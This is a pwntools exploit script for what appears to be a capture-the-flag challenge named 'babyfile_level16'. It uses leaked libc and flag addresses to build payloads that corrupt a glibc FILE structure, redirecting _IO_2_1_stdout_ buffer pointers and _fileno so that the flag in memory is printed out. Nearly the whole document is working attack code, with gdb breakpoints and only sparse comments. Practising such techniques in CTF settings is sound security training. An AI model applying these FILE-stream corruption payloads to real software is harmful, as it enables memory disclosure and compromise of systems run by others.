#!/usr/bin/env python3
from pwn import *

# Process setup
p = process('./babyfile_level16')
s = '''
b * fread
b * fread+184
b * __GI__IO_wdoallocbuf
b * _IO_wfile_overflow+41
b * _IO_2_1_stdout_
'''
# Extract addresses
p.recvuntil(b'is located at ')
flag_addr = int(p.recvline().strip(), 16)

p.recvuntil(b'puts() within libc is: ')
puts_addr = int(p.recvline().strip(), 16)

_IO_2_1_stdout_ = puts_addr + 0x169280


log.info(f"puts: {hex(puts_addr)}")
log.info(f"flag_addr: {hex(flag_addr)}")
log.info(f"_IO_2_1_stdout_: {_IO_2_1_stdout_}")


p.sendline("open_file")
p.sendline("new_note 0 96")

p.sendline("write_fp")

offset_to_buf_base = 0x8 * 7
payload = b'\x00' * offset_to_buf_base
payload += p64(_IO_2_1_stdout_)
payload += p64(_IO_2_1_stdout_ + 97)
payload += b'\x00' * (0x8 * 5)
payload += p64(0)
p.sendline(payload)



gdb.attach(p, s)
time.sleep(1)

p.sendline(b"read_file 0")

offset_to_write_base = 0x8 * 1
payload = p64(0x800)
payload += b"\x00" * offset_to_write_base  # Padding
payload += p64(flag_addr) # leaking stuff on the stack i.e. the rip
payload += p64(0)
payload += p64(flag_addr)
payload += p64(flag_addr+0x120) 
payload += b'\x00' * (0x8 * 8)
payload += p64(1) # _fileno = 1, stdout

#payload = b'A'
p.sendline(payload.ljust(96, b'\x00')) # 96 only, not going to overwrite the pointers afterwards, for example: 0x7d58cc1a17e0 (_IO_stdfile_1_lock) at offset 0x88


p.interactive()

